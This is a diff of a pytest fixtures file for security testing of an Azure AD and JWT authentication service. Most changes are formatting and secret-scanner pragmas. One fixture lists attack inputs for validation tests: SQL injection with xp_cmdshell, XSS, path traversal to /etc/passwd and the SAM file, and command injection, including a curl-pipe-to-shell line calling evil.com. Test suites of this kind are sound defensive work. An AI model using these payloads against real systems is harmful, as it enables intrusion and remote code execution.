@@ -6,20 +6,18 @@ tokens, and simulating various security scenarios including multi-tenant setups.
 """
 
 import base64
-import json
 import time
 from datetime import datetime, timedelta, timezone
-from typing import Any, Dict, List, Optional
-from unittest.mock import AsyncMock, MagicMock, Mock, patch
+from typing import Any, Dict, Optional
+from unittest.mock import AsyncMock, MagicMock
 
 import jwt
 import pytest
 from azure.identity import ClientSecretCredential
-from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.serialization import (
     Encoding,
-    NoEncryptionAvailable,
+    NoEncryption,
     PrivateFormat,
     PublicFormat,
 )
@@ -38,19 +36,18 @@ def mock_rsa_keys():
     private_pem = private_key.private_bytes(
         encoding=Encoding.PEM,
         format=PrivateFormat.PKCS8,
-        encryption_algorithm=NoEncryptionAvailable()
+        encryption_algorithm=NoEncryption(),
     )
 
     public_pem = public_key.public_bytes(
-        encoding=Encoding.PEM,
-        format=PublicFormat.SubjectPublicKeyInfo
+        encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo
     )
 
     return {
         "private_key": private_key,
         "public_key": public_key,
         "private_pem": private_pem,
-        "public_pem": public_pem
+        "public_pem": public_pem,
     }
 
 
@@ -58,12 +55,12 @@ def mock_rsa_keys():
 def azure_ad_config():
     """Provide test Azure AD configuration."""
     return {
-        "tenant_id": "test-tenant-12345",
-        "client_id": "test-client-67890",
-        "client_secret": "test-secret-abcdef",
+        "tenant_id": "test-tenant-12345",  # pragma: allowlist secret
+        "client_id": "test-client-67890",  # pragma: allowlist secret
+        "client_secret": "test-secret-abcdef",  # pragma: allowlist secret
         "authority": "https://login.microsoftonline.com/test-tenant-12345",
         "scope": ["https://graph.microsoft.com/.default"],
-        "graph_endpoint": "https://graph.microsoft.com/v1.0"
+        "graph_endpoint": "https://graph.microsoft.com/v1.0",
     }
 
 
@@ -72,37 +69,38 @@ def multi_tenant_config():
     """Provide configuration for multi-tenant testing."""
     return {
         "primary_tenant": {
-            "tenant_id": "primary-tenant-123",
-            "client_id": "primary-client-456",
-            "client_secret": "primary-secret-789",
-            "display_name": "Primary Tenant"
+            "tenant_id": "primary-tenant-123",  # pragma: allowlist secret
+            "client_id": "primary-client-456",  # pragma: allowlist secret
+            "client_secret": "primary-secret-789",  # pragma: allowlist secret
+            "display_name": "Primary Tenant",
         },
         "secondary_tenants": [
             {
-                "tenant_id": "secondary-tenant-001",
-                "client_id": "secondary-client-001",
-                "client_secret": "secondary-secret-001",
-                "display_name": "Secondary Tenant 1"
+                "tenant_id": "secondary-tenant-001",  # pragma: allowlist secret
+                "client_id": "secondary-client-001",  # pragma: allowlist secret
+                "client_secret": "secondary-secret-001",  # pragma: allowlist secret
+                "display_name": "Secondary Tenant 1",
             },
             {
-                "tenant_id": "secondary-tenant-002",
-                "client_id": "secondary-client-002",
-                "client_secret": "secondary-secret-002",
-                "display_name": "Secondary Tenant 2"
-            }
-        ]
+                "tenant_id": "secondary-tenant-002",  # pragma: allowlist secret
+                "client_id": "secondary-client-002",  # pragma: allowlist secret
+                "client_secret": "secondary-secret-002",  # pragma: allowlist secret
+                "display_name": "Secondary Tenant 2",
+            },
+        ],
     }
 
 
 @pytest.fixture
 def create_test_token(mock_rsa_keys):
     """Factory fixture to create test JWT tokens with custom claims."""
+
     def _create_token(
         claims: Optional[Dict[str, Any]] = None,
         expires_in: int = 3600,
         expired: bool = False,
         invalid_signature: bool = False,
-        algorithm: str = "RS256"
+        algorithm: str = "RS256",
     ) -> str:
         """
         Create a test JWT token.
@@ -143,7 +141,7 @@ def create_test_token(mock_rsa_keys):
             "tenant_id": "test-tenant-12345",
             "tid": "test-tenant-12345",
             "uti": "test-uti-token",
-            "ver": "1.0"
+            "ver": "1.0",
         }
 
         if claims:
@@ -159,11 +157,7 @@ def create_test_token(mock_rsa_keys):
         else:
             signing_key = mock_rsa_keys["private_key"]
 
-        token = jwt.encode(
-            default_claims,
-            signing_key,
-            algorithm=algorithm
-        )
+        token = jwt.encode(default_claims, signing_key, algorithm=algorithm)
 
         return token
 
@@ -180,7 +174,7 @@ def mock_azure_ad_responses():
             "ext_expires_in": 3599,
             "access_token": "mock-access-token",
             "refresh_token": "mock-refresh-token",
-            "id_token": "mock-id-token"
+            "id_token": "mock-id-token",
         },
         "user_info": {
             "id": "user-12345",
@@ -189,7 +183,7 @@ def mock_azure_ad_responses():
             "userPrincipalName": "testuser@example.com",
             "jobTitle": "Security Tester",
             "department": "Security",
-            "officeLocation": "Remote"
+            "officeLocation": "Remote",
         },
         "group_info": {
             "id": "group-67890",
@@ -197,20 +191,20 @@ def mock_azure_ad_responses():
             "description": "Security administration group",
             "securityEnabled": True,
             "mailEnabled": False,
-            "members": ["user-12345", "user-23456"]
+            "members": ["user-12345", "user-23456"],
         },
         "service_principal": {
             "id": "sp-11111",
             "displayName": "Test Service Principal",
             "appId": "test-client-67890",
-            "servicePrincipalType": "Application"
+            "servicePrincipalType": "Application",
         },
         "tenant_info": {
             "id": "test-tenant-12345",
             "displayName": "Test Tenant",
             "tenantType": "AAD",
-            "countryCode": "US"
-        }
+            "countryCode": "US",
+        },
     }
 
 
@@ -220,25 +214,29 @@ def mock_graph_client(mock_azure_ad_responses):
     mock_client = MagicMock()
 
     # Mock user operations
-    mock_client.users.get = AsyncMock(return_value={
-        "value": [mock_azure_ad_responses["user_info"]]
-    })
-    mock_client.users.by_user_id = MagicMock(return_value=MagicMock(
-        get=AsyncMock(return_value=mock_azure_ad_responses["user_info"])
-    ))
+    mock_client.users.get = AsyncMock(
+        return_value={"value": [mock_azure_ad_responses["user_info"]]}
+    )
+    mock_client.users.by_user_id = MagicMock(
+        return_value=MagicMock(
+            get=AsyncMock(return_value=mock_azure_ad_responses["user_info"])
+        )
+    )
 
     # Mock group operations
-    mock_client.groups.get = AsyncMock(return_value={
-        "value": [mock_azure_ad_responses["group_info"]]
-    })
-    mock_client.groups.by_group_id = MagicMock(return_value=MagicMock(
-        get=AsyncMock(return_value=mock_azure_ad_responses["group_info"])
-    ))
+    mock_client.groups.get = AsyncMock(
+        return_value={"value": [mock_azure_ad_responses["group_info"]]}
+    )
+    mock_client.groups.by_group_id = MagicMock(
+        return_value=MagicMock(
+            get=AsyncMock(return_value=mock_azure_ad_responses["group_info"])
+        )
+    )
 
     # Mock service principal operations
-    mock_client.service_principals.get = AsyncMock(return_value={
-        "value": [mock_azure_ad_responses["service_principal"]]
-    })
+    mock_client.service_principals.get = AsyncMock(
+        return_value={"value": [mock_azure_ad_responses["service_principal"]]}
+    )
 
     return mock_client
 
@@ -251,10 +249,14 @@ def mock_credential(create_test_token):
     # Create a valid token
     test_token = create_test_token()
 
-    mock_cred.get_token = MagicMock(return_value=MagicMock(
-        token=test_token,
-        expires_on=int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp())
-    ))
+    mock_cred.get_token = MagicMock(
+        return_value=MagicMock(
+            token=test_token,
+            expires_on=int(
+                (datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()
+            ),
+        )
+    )
 
     return mock_cred
 
@@ -268,50 +270,44 @@ def security_test_data():
             "1' OR '1'='1",
             "admin'--",
             "' UNION SELECT * FROM passwords --",
-            "'; EXEC xp_cmdshell('dir'); --"
+            "'; EXEC xp_cmdshell('dir'); --",
         ],
         "xss_patterns": [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "javascript:alert('XSS')",
             "<body onload=alert('XSS')>",
-            "<iframe src='javascript:alert(\"XSS\")'>"
+            "<iframe src='javascript:alert(\"XSS\")'>",
         ],
         "path_traversal_patterns": [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config\\sam",
             "....//....//....//etc/passwd",
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-            "..%252f..%252f..%252fetc%252fpasswd"
+            "..%252f..%252f..%252fetc%252fpasswd",
         ],
         "command_injection_patterns": [
             "; ls -la",
             "| whoami",
             "& net user",
             "`cat /etc/passwd`",
-            "$(curl http://evil.com/shell.sh | sh)"
+            "$(curl http://evil.com/shell.sh | sh)",
         ],
-        "sensitive_data_patterns": {
-            "credit_card": "4111111111111111",
-            "ssn": "123-45-6789",
-            "api_key": "test_api_key_fake_value_for_testing",
-            "password": "P@ssw0rd123!",
-            "private_key": "-----BEGIN RSA PRIVATE KEY-----"
+        "sensitive_data_patterns": {  # pragma: allowlist secret
+            "credit_card": "4111111111111111",  # pragma: allowlist secret
+            "ssn": "123-45-6789",  # pragma: allowlist secret
+            "api_key": "test_api_key_fake_value_for_testing",  # pragma: allowlist secret
+            "password": "P@ssw0rd123!",  # pragma: allowlist secret
+            "private_key": "-----BEGIN RSA PRIVATE KEY-----",  # pragma: allowlist secret
         },
-        "weak_passwords": [
-            "password",
-            "123456",
-            "admin",
-            "qwerty",
-            "letmein"
-        ],
+        "weak_passwords": ["password", "123456", "admin", "qwerty", "letmein"],
         "strong_passwords": [
             "J#9kL$2mN@5pQ!8r",
             "Tr0ub4dor&3",
             "correcthorsebatterystaple",
             "P@$$w0rd!Str0ng#2024",
-            "MyS3cur3P@ssw0rd!123"
-        ]
+            "MyS3cur3P@ssw0rd!123",
+        ],
     }
 
 
@@ -330,7 +326,7 @@ def mock_environment_variables(monkeypatch, azure_ad_config):
         "MAX_LOGIN_ATTEMPTS": "3",
         "SESSION_TIMEOUT": "3600",
         "REQUIRE_MFA": "false",
-        "ALLOWED_ORIGINS": "http://localhost:3000,https://test.example.com"
+        "ALLOWED_ORIGINS": "http://localhost:3000,https://test.example.com",
     }
 
     for key, value in env_vars.items():
@@ -343,11 +339,13 @@ def mock_environment_variables(monkeypatch, azure_ad_config):
 def mock_neo4j_session():
     """Mock Neo4j session for database security testing."""
     mock_session = MagicMock()
-    mock_session.run = MagicMock(return_value=MagicMock(
-        data=MagicMock(return_value=[
-            {"id": 1, "name": "Test Node", "sensitive": False}
-        ])
-    ))
+    mock_session.run = MagicMock(
+        return_value=MagicMock(
+            data=MagicMock(
+                return_value=[{"id": 1, "name": "Test Node", "sensitive": False}]
+            )
+        )
+    )
     mock_session.close = MagicMock()
     return mock_session
 
@@ -368,6 +366,7 @@ def mock_redis_client():
 @pytest.fixture
 def rate_limiter():
     """Create a test rate limiter for API security testing."""
+
     class TestRateLimiter:
         def __init__(self, max_requests: int = 10, window_seconds: int = 60):
             self.max_requests = max_requests
@@ -381,7 +380,8 @@ def rate_limiter():
 
             # Clean old requests
             self.requests[client_id] = [
-                req_time for req_time in self.requests[client_id]
+                req_time
+                for req_time in self.requests[client_id]
                 if now - req_time < self.window_seconds
             ]
 
@@ -390,7 +390,7 @@ def rate_limiter():
                 return True
             return False
 
-        def reset(self, client_id: str = None):
+        def reset(self, client_id: Optional[str] = None):
             if client_id:
                 self.requests.pop(client_id, None)
             else:
@@ -409,7 +409,7 @@ def security_headers():
         "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
         "Content-Security-Policy": "default-src 'self'; script-src 'self' 'unsafe-inline';",
         "Referrer-Policy": "strict-origin-when-cross-origin",
-        "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
+        "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
     }
 
 
